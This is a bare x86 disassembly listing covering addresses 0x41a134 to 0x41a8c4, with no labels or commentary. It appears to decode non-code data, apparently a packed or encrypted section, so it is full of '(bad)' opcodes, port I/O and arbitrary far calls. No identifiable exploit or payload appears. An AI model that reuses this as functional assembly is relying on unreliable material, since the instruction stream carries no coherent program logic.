  41a134:	sub    al,0xa
  41a136:	sbb    eax,0x3fbada9c
  41a13b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a13c:	pop    es
  41a13d:	shl    DWORD PTR [esi+0xb],0xc3
  41a141:	(bad)  
  41a142:	fdiv   QWORD PTR [ebx-0x45]
  41a145:	inc    ebp
  41a146:	call   0xed29d5e7
  41a14b:	imul   esi
  41a14d:	push   ebx
  41a14e:	mov    DWORD PTR [edi+0x6e],ecx
  41a151:	mov    ebp,0xf582682
  41a156:	and    al,0x29
  41a158:	popa   
  41a159:	out    0xac,al
  41a15b:	loopne 0x41a0e4
  41a15d:	daa    
  41a15e:	jo     0x41a131
  41a160:	push   ss
  41a161:	pop    eax
  41a162:	mov    dl,0xbb
  41a164:	(bad)  
  41a165:	or     bh,BYTE PTR [eax-0x6326382a]
  41a16b:	mov    dh,0x65
  41a16d:	fstp   DWORD PTR [eax+0x77]
  41a170:	mov    DWORD PTR [esp+ebx*2],ebx
  41a173:	jle    0x41a14b
  41a175:	push   esi
  41a176:	push   ecx
  41a177:	or     ebp,DWORD PTR [ebx]
  41a179:	ror    DWORD PTR [esp+ebx*1-0x6f266944],1
  41a180:	sbb    al,0x9f
  41a182:	sahf   
  41a183:	add    cl,BYTE PTR [ecx]
  41a185:	dec    esi
  41a186:	fcmovb st,st(1)
  41a188:	add    BYTE PTR [edi+0x531dcabf],ah
  41a18e:	mov    esi,0x3f93be5e
  41a193:	ins    DWORD PTR es:[edi],dx
  41a194:	adc    bl,BYTE PTR [esi-0x473c85d2]
  41a19a:	outs   dx,BYTE PTR ds:[esi]
  41a19b:	or     DWORD PTR es:[edi-0x135b1f53],esi
  41a1a2:	or     eax,0x12ccf804
  41a1a7:	push   edi
  41a1a8:	outs   dx,BYTE PTR ds:[esi]
  41a1a9:	sbb    ebx,DWORD PTR ds:0x6b3803ae
  41a1af:	jp     0x41a137
  41a1b1:	test   eax,0x9a9838f8
  41a1b6:	add    BYTE PTR [edi-0x27d3a9e2],dh
  41a1bc:	xor    DWORD PTR [ebp+0x37],ebx
  41a1bf:	addr16 sahf 
  41a1c1:	adc    DWORD PTR [edx+0x16dda222],ebx
  41a1c7:	mov    al,ds:0x2b10ea28
  41a1cc:	dec    ecx
  41a1cd:	js     0x41a16f
  41a1cf:	jae    0x41a20b
  41a1d1:	mov    ah,0x58
  41a1d3:	inc    DWORD PTR [eax]
  41a1d5:	(bad)  
  41a1d6:	fsub   st(1),st
  41a1d8:	lds    esi,FWORD PTR [ebx-0x52]
  41a1db:	test   eax,0x20adb056
  41a1e0:	add    al,0xff
  41a1e2:	or     BYTE PTR [esi+0x1cb815],cl
  41a1e8:	mov    DWORD PTR [edx+0x46],esi
  41a1eb:	jle    0x41a1a7
  41a1ed:	jle    0x41a1e4
  41a1ef:	sub    al,0xf0
  41a1f1:	loope  0x41a24c
  41a1f3:	sub    ah,0xf1
  41a1f6:	mov    edx,0xc02d349c
  41a1fb:	adc    DWORD PTR [edx+0x2fd4283c],ebp
  41a201:	push   esi
  41a203:	sub    ecx,eax
  41a205:	psubusb mm5,QWORD PTR [eax]
  41a208:	adc    ah,ch
  41a20a:	jl     0x41a275
  41a20c:	popa   
  41a20d:	iret   
  41a20e:	push   ecx
  41a20f:	fstp   TBYTE PTR [esi+eax*2+0x6cc58da3]
  41a216:	or     eax,0xd0ee4237
  41a21b:	mov    WORD PTR [edx-0x6647d3e0],es
  41a221:	lds    eax,FWORD PTR [ebx]
  41a223:	lods   eax,DWORD PTR ds:[esi]
  41a224:	in     al,0x56
  41a226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a227:	xor    DWORD PTR [esi+0x2b],ecx
  41a22a:	in     al,dx
  41a22b:	xchg   edx,eax
  41a22c:	popa   
  41a22d:	sbb    BYTE PTR [esi],al
  41a22f:	ret    
  41a230:	aaa    
  41a231:	or     dl,dh
  41a233:	nop
  41a234:	mov    eax,0xa0207106
  41a239:	push   es
  41a23a:	mov    edi,0x67dd105b
  41a23f:	(bad)
  41a242:	add    eax,0xcc51dc9d
  41a247:	(bad)  
  41a248:	xor    DWORD PTR [eax+0x1f78f4cb],edi
  41a24e:	fwait
  41a24f:	mov    ebx,0x4c3ebfc
  41a254:	cmp    al,0x8d
  41a256:	xchg   edx,eax
  41a257:	push   ecx
  41a258:	lock nop
  41a25a:	lods   eax,DWORD PTR fs:[esi]
  41a25c:	adc    ah,bl
  41a25e:	cmp    dl,BYTE PTR [esi+0x33]
  41a261:	jo     0x41a2b4
  41a263:	icebp  
  41a264:	loopne 0x41a2e3
  41a266:	into   
  41a267:	adc    al,0xc
  41a269:	mov    dl,0xf2
  41a26b:	mov    ah,0x24
  41a26d:	push   ebp
  41a26e:	pop    esi
  41a26f:	push   esi
  41a270:	push   ecx
  41a271:	rcl    BYTE PTR [ecx-0x21],0x3
  41a275:	jb     0x41a255
  41a277:	mov    eax,0xe4a38a3d
  41a27c:	mov    al,0xaa
  41a27e:	push   0x4f889923
  41a283:	fsub   st(0),st
  41a285:	dec    edx
  41a286:	scas   eax,DWORD PTR es:[edi]
  41a287:	jns    0x41a2ca
  41a289:	cs inc ecx
  41a28b:	lods   al,BYTE PTR ds:[esi]
  41a28c:	inc    esp
  41a28d:	fistp  WORD PTR [eax+0x1e915946]
  41a293:	pop    ss
  41a294:	or     DWORD PTR [edi-0x4c],edi
  41a297:	xchg   ebp,eax
  41a298:	xchg   ebp,ebp
  41a29a:	adc    eax,0x5fddeb08
  41a29f:	lea    ecx,[eax-0xbccce69]
  41a2a5:	adc    bl,BYTE PTR [ebx]
  41a2a7:	iret   
  41a2a8:	mov    esp,0xa4c0d6c0
  41a2ad:	sub    eax,0x61bf3dac
  41a2b2:	and    eax,0xcec7c4ea
  41a2b7:	es push 0xffffff82
  41a2ba:	ficom  DWORD PTR [eax+0x56db7acf]
  41a2c0:	lahf   
  41a2c1:	xlat   BYTE PTR ds:[ebx]
  41a2c2:	inc    DWORD PTR [edx+0x32]
  41a2c5:	sahf   
  41a2c6:	push   0x12
  41a2c8:	scas   eax,DWORD PTR es:[edi]
  41a2c9:	mov    al,ds:0x24b7f901
  41a2ce:	mov    esp,0x7d6a8677
  41a2d3:	dec    edi
  41a2d5:	inc    ebp
  41a2d6:	(bad)  
  41a2d7:	xchg   esi,eax
  41a2d8:	dec    esi
  41a2d9:	pop    edi
  41a2da:	mov    ebx,0x10574b90
  41a2df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2e0:	xor    al,0xc5
  41a2e2:	add    al,0xcc
  41a2e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2e5:	out    0x73,eax
  41a2e7:	aas    
  41a2e8:	add    al,0xbc
  41a2ea:	cld    
  41a2eb:	out    0x58,al
  41a2ed:	iret   
  41a2ee:	outs   dx,DWORD PTR ds:[esi]
  41a2ef:	sbb    dl,bh
  41a2f1:	rcl    ebx,1
  41a2f3:	gs xchg ecx,eax
  41a2f5:	mov    al,ds:0x1b3a8de
  41a2fa:	cmp    bl,al
  41a2fc:	mov    cs,WORD PTR [ebp-0x7fd5e352]
  41a302:	and    edi,esp
  41a304:	xchg   edx,eax
  41a305:	inc    ecx
  41a306:	sbb    al,0x59
  41a308:	stc    
  41a309:	jae    0x41a2a0
  41a30b:	xchg   ecx,eax
  41a30c:	pop    eax
  41a30d:	push   eax
  41a30e:	xchg   ebp,eax
  41a30f:	bound  esp,QWORD PTR [edx]
  41a311:	out    0x70,eax
  41a313:	lds    ebp,FWORD PTR [edi+0x7f15e1bd]
  41a319:	(bad)  [edx+0xa36cff0]
  41a31f:	mov    cl,0xdf
  41a321:	rol    edi,0x68
  41a324:	fldcw  WORD PTR [ebp+0x8a7ecdf]
  41a32a:	adc    ebx,esp
  41a32c:	int3   
  41a32d:	push   0x42
  41a32f:	cld    
  41a330:	jecxz  0x41a2f3
  41a332:	stos   DWORD PTR es:[edi],eax
  41a333:	jb     0x41a2cf
  41a335:	shl    BYTE PTR [ebx+0x40],cl
  41a338:	js     0x41a329
  41a33a:	gs or  BYTE PTR fs:[esi-0x60665cd1],al
  41a342:	sti    
  41a343:	loopne 0x41a39c
  41a345:	aam    0x8c
  41a347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a348:	pop    ecx
  41a349:	pushf  
  41a34a:	mov    ecx,0x9c361e07
  41a34f:	lahf   
  41a350:	or     bh,bh
  41a352:	mov    al,0x6f
  41a354:	fwait
  41a355:	mov    ah,0xa3
  41a357:	sbb    esi,ecx
  41a359:	imul   edx,DWORD PTR [edx+0x5ba5b92],0x4aa93daf
  41a363:	fwait
  41a364:	jnp    0x41a2ff
  41a366:	dec    eax
  41a367:	(bad)
  41a36b:	sbb    al,0xe6
  41a36d:	bound  esi,QWORD PTR [ebp-0xa57d193]
  41a373:	rcl    DWORD PTR [eax],0xc7
  41a376:	jo     0x41a30a
  41a378:	repz imul edx,DWORD PTR [ebx+esi*1-0x1d],0x6c2c55df
  41a381:	xchg   ebp,eax
  41a382:	pop    ds
  41a383:	arpl   WORD PTR [ebp+eiz*1-0x3a2011f2],ax
  41a38a:	adc    dl,al
  41a38c:	test   al,0x4f
  41a38e:	sbb    BYTE PTR [ecx+0x16bcde7c],0xae
  41a395:	stos   DWORD PTR es:[edi],eax
  41a396:	iret   
  41a397:	add    al,0x6a
  41a399:	pop    ds
  41a39a:	hlt    
  41a39b:	out    0x67,eax
  41a39d:	out    0x2c,eax
  41a39f:	fisttp DWORD PTR [eax-0x48]
  41a3a2:	pop    esp
  41a3a3:	test   BYTE PTR [ebx-0x13],bh
  41a3a6:	sbb    dh,BYTE PTR [edx+eax*2]
  41a3a9:	adc    eax,0xb98a77bb
  41a3ae:	out    0x33,al
  41a3b0:	and    eax,0xb93775ff
  41a3b5:	repz shr DWORD PTR [ebp+0x40f2c029],1
  41a3bc:	xchg   edx,eax
  41a3bd:	fdivr  QWORD PTR [ebp+0x69]
  41a3c0:	adc    eax,0x81bdfa5f
  41a3c5:	or     DWORD PTR [ebp+0x6d],edi
  41a3c8:	out    dx,al
  41a3c9:	popf   
  41a3ca:	cwde   
  41a3cb:	aaa    
  41a3cc:	mov    ecx,0x95bbf045
  41a3d1:	cmp    edx,DWORD PTR [esp+eiz*2]
  41a3d4:	jmp    0x3a30e20f
  41a3d9:	sbb    al,0x8e
  41a3db:	ret    
  41a3dc:	das    
  41a3dd:	jmp    0x41a3af
  41a3df:	jno    0x41a385
  41a3e1:	daa    
  41a3e2:	fist   WORD PTR [edx]
  41a3e4:	lea    ebx,[esp+esi*4]
  41a3e7:	jno    0x41a43e
  41a3e9:	mov    cl,0x99
  41a3eb:	(bad)  
  41a3ec:	shl    BYTE PTR ds:0xc67ea559,cl
  41a3f2:	mul    BYTE PTR [eax+0x1e]
  41a3f5:	jb     0x41a416
  41a3f7:	jmp    0x41a421
  41a3f9:	aad    0x3e
  41a3fb:	mov    ds:0x6b5875be,al
  41a400:	jo     0x41a470
  41a402:	(bad)  
  41a404:	das    
  41a405:	xchg   DWORD PTR [eax],ecx
  41a407:	mov    ebx,edx
  41a409:	inc    ebp
  41a40a:	jge    0x41a452
  41a40c:	and    eax,0x7e3fe9ba
  41a411:	loop   0x41a482
  41a413:	and    BYTE PTR ds:0xaa2af7ac,0x14
  41a41a:	jbe    0x41a417
  41a41c:	mov    ch,0xbc
  41a41e:	(bad)  
  41a41f:	(bad)  
  41a420:	jne    0x41a3bd
  41a422:	adc    al,0x6c
  41a424:	push   ebx
  41a425:	in     al,dx
  41a426:	mov    eax,0x1a0a1335
  41a42b:	es jge 0x41a411
  41a42e:	daa    
  41a42f:	arpl   di,dx
  41a431:	(bad)  
  41a432:	aam    0x7c
  41a434:	jg     0x41a4b0
  41a436:	or     BYTE PTR [edx+0x5ecab20c],0x46
  41a43d:	add    BYTE PTR [esi+0x1b],dh
  41a440:	mov    ebp,0x9a3db4e2
  41a445:	dec    edx
  41a446:	xchg   DWORD PTR [ebp+0x37f40438],ebx
  41a44c:	xor    BYTE PTR [edx],bl
  41a44e:	lock jno 0x41a4ac
  41a451:	(bad)  
  41a452:	sub    DWORD PTR [edx-0x31],esi
  41a455:	test   BYTE PTR [eax-0x39],bl
  41a458:	add    edx,DWORD PTR [ecx-0x6b4e7f99]
  41a45e:	sbb    eax,0x48cdabda
  41a463:	xor    al,0xfa
  41a465:	cmp    dl,BYTE PTR [edx]
  41a467:	jle    0x41a400
  41a469:	ror    DWORD PTR [ebx+0x4e05c166],cl
  41a46f:	neg    DWORD PTR [ebx+0x513665ee]
  41a475:	push   cs
  41a476:	push   eax
  41a477:	ja     0x41a4b4
  41a479:	scas   al,BYTE PTR es:[edi]
  41a47a:	jmp    DWORD PTR [ecx+0x40]
  41a47d:	test   al,al
  41a47f:	gs push ecx
  41a481:	out    dx,al
  41a482:	stc    
  41a483:	stos   DWORD PTR es:[edi],eax
  41a484:	and    al,0x59
  41a486:	push   esp
  41a487:	mov    ch,0x90
  41a489:	cld    
  41a48a:	xor    eax,0xfaa86dab
  41a48f:	mov    ch,0xa0
  41a491:	add    BYTE PTR [edi-0x47],0x75
  41a495:	push   ecx
  41a496:	inc    ebp
  41a497:	jl     0x41a463
  41a499:	mov    eax,DWORD PTR [eax]
  41a49b:	test   ebp,edi
  41a49d:	adc    eax,DWORD PTR [ecx+0x9]
  41a4a0:	and    BYTE PTR [ebp-0x80],0x65
  41a4a4:	mov    DWORD PTR [edx-0x5d],0xac653598
  41a4ab:	mov    ecx,0x51546f03
  41a4b0:	pop    ebp
  41a4b1:	xchg   ebx,eax
  41a4b2:	xlat   BYTE PTR ds:[ebx]
  41a4b3:	add    ecx,DWORD PTR [ebp+0x2f]
  41a4b6:	push   0xffffffd2
  41a4b8:	ins    DWORD PTR es:[edi],dx
  41a4b9:	pop    eax
  41a4ba:	xor    esp,0x2d
  41a4bd:	adc    eax,0x4a19c00a
  41a4c2:	mov    ?,esp
  41a4c4:	cld    
  41a4c5:	jg     0x41a4c2
  41a4c7:	leave  
  41a4c8:	sbb    ecx,0x429e6459
  41a4ce:	add    eax,ecx
  41a4d0:	xchg   ecx,eax
  41a4d1:	sahf   
  41a4d2:	xor    dh,dh
  41a4d4:	mov    edi,0x8842bcca
  41a4d9:	ds xchg ecx,eax
  41a4db:	cmp    DWORD PTR [edi-0xf],eax
  41a4de:	jl     0x41a506
  41a4e0:	fs pop esi
  41a4e2:	out    0x19,al
  41a4e4:	sahf   
  41a4e5:	mov    ecx,0x8db2628b
  41a4ea:	in     al,dx
  41a4eb:	lea    ebp,[eax-0x58266f47]
  41a4f1:	xor    BYTE PTR [eax+eax*2+0x4b3d7e2f],ah
  41a4f8:	xor    dh,BYTE PTR [eax+0x1c47cada]
  41a4fe:	inc    edi
  41a4ff:	sub    BYTE PTR [ebx+edx*8-0x38d2155d],0xfa
  41a507:	stos   DWORD PTR es:[edi],eax
  41a508:	jp     0x41a580
  41a50a:	in     al,0x6d
  41a50c:	sub    al,0x5d
  41a50e:	call   0x2e221d0b
  41a513:	xor    dh,al
  41a515:	mov    dl,0x35
  41a517:	mov    esp,0x74cb4e70
  41a51c:	jg     0x41a4a5
  41a51e:	out    dx,al
  41a51f:	jg     0x41a532
  41a521:	fdivr  QWORD PTR ds:0x5a65586e
  41a527:	or     eax,0x3716305f
  41a52c:	mov    ah,BYTE PTR fs:[ebx-0x279bfda5]
  41a533:	sub    al,0x27
  41a535:	sub    ah,BYTE PTR [ebp+ecx*2-0x1c]
  41a539:	mov    edi,0x58fd90de
  41a53e:	xchg   esp,eax
  41a53f:	add    DWORD PTR [edi-0xf],edx
  41a542:	mov    al,ds:0x266e484
  41a547:	inc    edx
  41a548:	inc    edx
  41a549:	ret    
  41a54a:	daa    
  41a54b:	inc    ebp
  41a54c:	test   eax,0x37682ead
  41a551:	inc    edx
  41a552:	mov    cl,0x7e
  41a554:	add    ah,bh
  41a556:	test   ch,0x1c
  41a559:	jns    0x41a4de
  41a55b:	ror    DWORD PTR [edx-0x482b12fa],cl
  41a561:	sti    
  41a562:	mov    ?,WORD PTR [ecx+0x75]
  41a565:	je     0x41a581
  41a567:	call   0x331b:0x5ff9e030
  41a56e:	in     al,dx
  41a56f:	pop    ebp
  41a570:	idiv   DWORD PTR [ecx+0x44]
  41a573:	xor    al,0xdc
  41a575:	stos   DWORD PTR es:[edi],eax
  41a576:	jmp    0x41a529
  41a578:	loopne 0x41a51d
  41a57a:	out    0x72,al
  41a57c:	in     al,0x1d
  41a57e:	or     BYTE PTR [eax+0x62],ah
  41a581:	mov    dl,BYTE PTR [edi+eax*2-0x18]
  41a585:	add    dh,BYTE PTR [eax-0x56a5bc81]
  41a58b:	les    edx,FWORD PTR [ebx]
  41a58d:	fmul   QWORD PTR [ecx+0x4a]
  41a590:	mov    ebx,0x26c5cca
  41a595:	ins    BYTE PTR es:[edi],dx
  41a596:	pop    esi
  41a597:	or     eax,0xec216bed
  41a59c:	js     0x41a604
  41a59e:	inc    esi
  41a59f:	imul   edx,DWORD PTR [edi],0x2654810e
  41a5a5:	sub    BYTE PTR [ecx+0x150d78d3],bh
  41a5ab:	sbb    DWORD PTR [ebx+edi*8+0x50],edx
  41a5af:	lds    ebp,FWORD PTR cs:[edx+0x22]
  41a5b3:	pusha  
  41a5b4:	ss out dx,eax
  41a5b6:	mov    bh,0x12
  41a5b8:	and    edi,DWORD PTR [edi]
  41a5ba:	add    al,0x2a
  41a5bc:	bound  esp,QWORD PTR [esi+0x7808f273]
  41a5c2:	aam    0xdc
  41a5c4:	dec    eax
  41a5c5:	fisub  DWORD PTR [ebx]
  41a5c7:	xor    al,0x44
  41a5c9:	fst    DWORD PTR [edi]
  41a5cb:	add    eax,DWORD PTR ds:0xe3497073
  41a5d1:	sahf   
  41a5d2:	stos   DWORD PTR es:[edi],eax
  41a5d3:	jp     0x41a5d1
  41a5d5:	lds    esi,FWORD PTR [esi-0x729ec5c9]
  41a5db:	mov    ss,WORD PTR [eax]
  41a5dd:	stos   BYTE PTR es:[edi],al
  41a5de:	ds mov ebx,0x4988e3ee
  41a5e4:	jo     0x41a63b
  41a5e6:	push   esp
  41a5e7:	mov    eax,DWORD PTR [ebp+0x42]
  41a5ea:	mov    dh,0x7
  41a5ec:	mov    eax,ds:0xbf74407c
  41a5f1:	mov    esi,ecx
  41a5f3:	shl    DWORD PTR [edx+0x6],0x7c
  41a5f7:	pop    DWORD PTR [ecx-0x18]
  41a5fa:	stos   DWORD PTR es:[edi],eax
  41a5fb:	cld    
  41a5fc:	jno    0x41a64f
  41a5fe:	mov    ebp,0xaaa400dc
  41a603:	xor    BYTE PTR [eax+esi*2-0xb],dl
  41a607:	data16 aad 0x8b
  41a60a:	inc    ebp
  41a60b:	push   es
  41a60c:	hlt    
  41a60d:	cdq    
  41a60e:	stc    
  41a60f:	jae    0x41a597
  41a611:	popf   
  41a612:	sbb    eax,0xf1923c0d
  41a617:	ds js  0x41a5a6
  41a61a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a61b:	imul   cx,WORD PTR [ebx+0x19],0x4b
  41a620:	int3   
  41a621:	into   
  41a622:	call   0xeee0:0xeee4a49e
  41a629:	clc    
  41a62a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a62b:	xchg   edx,eax
  41a62c:	adc    eax,0x977655f0
  41a631:	(bad)  
  41a632:	mov    dh,0x94
  41a634:	xchg   edx,eax
  41a635:	jmp    0x41a629
  41a637:	fisttp DWORD PTR ds:0x89e6b1cf
  41a63d:	shl    BYTE PTR [edx+0x59],0x2d
  41a641:	(bad)  
  41a642:	jno    0x41a642
  41a644:	cmp    eax,0xf11644e1
  41a649:	js     0x41a688
  41a64b:	loop   0x41a64d
  41a64d:	inc    eax
  41a64e:	shr    ecx,cl
  41a650:	xchg   edx,eax
  41a651:	pushf  
  41a652:	dec    esp
  41a653:	in     al,dx
  41a654:	pop    edi
  41a655:	pop    ds
  41a656:	pop    ecx
  41a657:	sub    DWORD PTR [edi],edi
  41a659:	(bad)
  41a65c:	inc    DWORD PTR [esi]
  41a65e:	push   ss
  41a65f:	pop    esp
  41a660:	xor    al,0xb5
  41a662:	div    BYTE PTR [ebx+0x2ce11042]
  41a668:	pop    ebp
  41a669:	mov    al,ds:0x7c7ab218
  41a66e:	sidtd  [ebp-0xf95c798]
  41a675:	mov    ds:0x6239735,al
  41a67a:	cdq    
  41a67b:	cmp    eax,0xb7071a33
  41a680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a681:	push   ss
  41a682:	xchg   ecx,eax
  41a683:	aaa    
  41a684:	xlat   BYTE PTR ds:[ebx]
  41a685:	and    al,0xe2
  41a687:	jo     0x41a682
  41a689:	jle    0x41a693
  41a68b:	pop    ebp
  41a68c:	adc    bh,BYTE PTR [edx-0x492dd964]
  41a692:	retf   0x33bf
  41a695:	lods   eax,DWORD PTR ds:[esi]
  41a696:	pop    esi
  41a697:	add    eax,0x7185c3ee
  41a69c:	adc    al,0xea
  41a69e:	das    
  41a69f:	inc    esi
  41a6a0:	cmp    al,0x6e
  41a6a2:	xchg   esi,eax
  41a6a3:	ins    BYTE PTR es:[edi],dx
  41a6a4:	mov    eax,ds:0x2fc0185f
  41a6a9:	xchg   edx,eax
  41a6aa:	mov    es,WORD PTR [esi+0x49]
  41a6ad:	pop    edi
  41a6ae:	dec    ecx
  41a6af:	xor    BYTE PTR [edx],bl
  41a6b1:	popf   
  41a6b2:	mov    ebx,0xa61fd5d5
  41a6b7:	mov    ch,0x69
  41a6b9:	add    esi,DWORD PTR [edi]
  41a6bb:	shl    DWORD PTR [ebp+ecx*8-0x475bb69f],0x2d
  41a6c3:	or     ecx,0xd05c7b97
  41a6c9:	dec    edx
  41a6ca:	push   eax
  41a6cb:	dec    edi
  41a6cc:	out    0xbc,al
  41a6ce:	cli    
  41a6cf:	addr16 test al,0xe9
  41a6d2:	out    dx,al
  41a6d3:	out    0x20,eax
  41a6d5:	cdq    
  41a6d6:	xchg   ebx,eax
  41a6d7:	add    al,0x8
  41a6d9:	jbe    0x41a733
  41a6db:	xor    al,0xb4
  41a6dd:	cmc    
  41a6de:	adc    eax,0xbae3ec4
  41a6e3:	and    BYTE PTR [eax-0x18],0x8b
  41a6e7:	sti    
  41a6e8:	xchg   ebx,eax
  41a6e9:	cli    
  41a6ea:	mov    edi,0x499a53de
  41a6ef:	xchg   DWORD PTR [eax-0x7a],ebp
  41a6f2:	sub    DWORD PTR [eax],edx
  41a6f4:	xchg   ebp,eax
  41a6f5:	mov    al,ds:0x95eb28ca
  41a6fa:	out    dx,al
  41a6fb:	mov    ds:0xb86147af,al
  41a700:	scas   al,BYTE PTR es:[edi]
  41a701:	into   
  41a702:	mov    bl,0xb
  41a704:	dec    ebx
  41a705:	and    BYTE PTR [ecx-0x73f969b1],bl
  41a70b:	sbb    al,0x63
  41a70d:	inc    ebp
  41a70e:	repz rcr DWORD PTR [eax-0x66],0xfa
  41a713:	jecxz  0x41a74f
  41a715:	xchg   edi,eax
  41a716:	das    
  41a717:	lea    ecx,[ebx-0xa]
  41a71a:	mov    esi,0x523cbead
  41a71f:	dec    edi
  41a720:	retf   0x25b2
  41a723:	jmp    0x41a743
  41a725:	daa    
  41a726:	xlat   BYTE PTR ds:[ebx]
  41a727:	outs   dx,BYTE PTR ds:[esi]
  41a728:	mov    eax,0x45b01804
  41a72d:	jmp    0x41a79a
  41a72f:	dec    edi
  41a730:	push   es
  41a731:	and    dh,BYTE PTR [edi]
  41a733:	sbb    DWORD PTR [edi+0x7e031b7],ebp
  41a739:	xchg   ecx,eax
  41a73a:	add    BYTE PTR [ecx-0x3a902bdf],0xf4
  41a741:	inc    esp
  41a742:	scas   al,BYTE PTR es:[edi]
  41a743:	xchg   DWORD PTR [ecx],esi
  41a745:	cdq    
  41a746:	push   0x8df4289b
  41a74b:	pop    edx
  41a74c:	push   esp
  41a74d:	cmp    eax,0x967fa5e0
  41a752:	ror    DWORD PTR [ecx-0x7d3c3a2a],0x4e
  41a759:	mov    ebp,0x2047e98d
  41a75e:	adc    ah,BYTE PTR [esi+0x17]
  41a761:	or     BYTE PTR [edi],al
  41a763:	iret   
  41a764:	aas    
  41a765:	push   ebx
  41a766:	mov    ecx,0xf0146132
  41a76b:	sub    bh,ch
  41a76d:	call   0x9870:0x76b56ad1
  41a774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a775:	sbb    al,0x26
  41a777:	daa    
  41a778:	cmp    ecx,edx
  41a77a:	mov    esp,0x9e1c4718
  41a77f:	dec    ecx
  41a780:	xor    dh,BYTE PTR [edi+0x3b]
  41a783:	jg     0x41a70b
  41a785:	adc    edx,ecx
  41a787:	(bad)  [ebx]
  41a789:	pop    es
  41a78a:	nop
  41a78b:	mov    esi,0x365163b0
  41a790:	fwait
  41a791:	sbb    al,0xe3
  41a793:	mov    al,0xb0
  41a795:	mov    bh,0x3c
  41a797:	mov    eax,ds:0xd27d6e84
  41a79c:	cmp    eax,0xb8c82617
  41a7a1:	cdq    
  41a7a2:	ret    0xee47
  41a7a5:	mov    esp,0x97fb97d8
  41a7aa:	mov    ds:0x847964,al
  41a7af:	(bad)  
  41a7b1:	cmp    BYTE PTR [ebx-0x22d4ee1d],ch
  41a7b7:	sbb    ebx,edi
  41a7b9:	and    ch,BYTE PTR [edi]
  41a7bb:	cmp    al,0x2c
  41a7bd:	mov    ah,BYTE PTR [edi+0x5d972b82]
  41a7c3:	std    
  41a7c4:	xchg   ecx,eax
  41a7c5:	dec    edx
  41a7c6:	xchg   esp,eax
  41a7c7:	rcr    BYTE PTR [ebp+0x61adf8ad],cl
  41a7cd:	(bad)  
  41a7cf:	loope  0x41a84b
  41a7d1:	mov    cl,0x9b
  41a7d3:	test   al,0x8e
  41a7d5:	lahf   
  41a7d6:	mov    ecx,0x715a3487
  41a7db:	push   ss
  41a7dc:	jnp    0x41a7f6
  41a7de:	ret    
  41a7df:	jge    0x41a808
  41a7e1:	cli    
  41a7e2:	dec    ecx
  41a7e3:	sbb    BYTE PTR [edi-0x1b],bl
  41a7e6:	es jge 0x41a788
  41a7e9:	retf   0x1e99
  41a7ec:	mov    ebx,DWORD PTR [ebp+0x0]
  41a7ef:	push   edi
  41a7f0:	pusha  
  41a7f1:	push   eax
  41a7f2:	adc    al,0x2b
  41a7f4:	ins    DWORD PTR es:[edi],dx
  41a7f5:	dec    esi
  41a7f6:	stos   BYTE PTR es:[edi],al
  41a7f7:	add    bl,0x29
  41a7fa:	and    al,BYTE PTR [esi-0x5e21f7b6]
  41a800:	out    dx,eax
  41a801:	inc    ebp
  41a802:	mov    cl,0x52
  41a804:	icebp  
  41a805:	adc    eax,0xa7f5fddf
  41a80a:	retf   0x77ff
  41a80d:	outs   dx,BYTE PTR ds:[esi]
  41a80e:	aad    0xb2
  41a810:	or     cl,ch
  41a812:	pop    esi
  41a813:	adc    BYTE PTR [eax],ah
  41a815:	mov    esp,0xd74e311c
  41a81a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a81b:	loope  0x41a86e
  41a81d:	nop
  41a81e:	xchg   ebx,eax
  41a81f:	outs   dx,DWORD PTR ds:[esi]
  41a820:	xchg   ecx,eax
  41a821:	sub    ebx,esp
  41a823:	add    eax,0x16afc1a4
  41a828:	pop    ecx
  41a829:	test   al,0x1e
  41a82b:	ror    dl,1
  41a82d:	and    cl,BYTE PTR [ebx]
  41a82f:	sbb    BYTE PTR [esp+eax*1],0x4f
  41a833:	jbe    0x41a7bd
  41a835:	adc    al,0x17
  41a837:	dec    edi
  41a838:	push   ecx
  41a839:	xchg   DWORD PTR [ebx],ebp
  41a83b:	stos   BYTE PTR es:[edi],al
  41a83c:	mov    edi,DWORD PTR [edx-0x2]
  41a83f:	call   0xe967:0xa1a4a5e5
  41a846:	sbb    dh,BYTE PTR [edx+0x44]
  41a849:	pop    ss
  41a84a:	test   eax,edx
  41a84c:	fist   WORD PTR [eax-0x246a525b]
  41a852:	shl    BYTE PTR [ebx+0x24fc5e00],0x24
  41a859:	fdivp  st(7),st
  41a85b:	add    dl,bh
  41a85d:	pusha  
  41a85e:	sti    
  41a85f:	push   es
  41a860:	push   ds
  41a861:	sub    al,BYTE PTR [edx-0x43]
  41a864:	jae    0x41a863
  41a866:	imul   esp,DWORD PTR ds:0x4b5b4f39,0xffffffd2
  41a86d:	sub    DWORD PTR [edx+0xc290e8],ebx
  41a873:	js     0x41a870
  41a875:	jae    0x41a8a0
  41a877:	and    bl,ah
  41a879:	scas   al,BYTE PTR es:[edi]
  41a87a:	ficom  WORD PTR [ecx-0x13]
  41a87d:	jnp    0x41a80d
  41a87f:	jg     0x41a812
  41a881:	xchg   ebp,eax
  41a882:	scas   eax,DWORD PTR es:[edi]
  41a883:	adc    al,0xe0
  41a885:	adc    edx,edi
  41a887:	xor    DWORD PTR [ecx],esi
  41a889:	call   0x5d59:0x548ffeea
  41a890:	dec    ebx
  41a891:	xor    al,0x1e
  41a893:	in     al,0xda
  41a895:	in     eax,dx
  41a896:	cmp    DWORD PTR [ebx-0x10911ab2],0x64
  41a89d:	mov    bh,0x69
  41a89f:	push   edx
  41a8a0:	sub    bl,dl
  41a8a2:	push   esi
  41a8a3:	imul   edi,ecx,0x20e1c215
  41a8a9:	bound  esi,QWORD PTR [eax]
  41a8ab:	xchg   ebp,eax
  41a8ac:	jmp    0x41a8f8
  41a8ae:	out    dx,eax
  41a8af:	mov    ah,0xb8
  41a8b1:	xchg   edi,eax
  41a8b2:	clc    
  41a8b3:	sbb    DWORD PTR [edi+0x3ad00b89],0xa439ebcd
  41a8bd:	shl    DWORD PTR [ebx-0x2e59ecc9],0xda
  41a8c4:	iret   
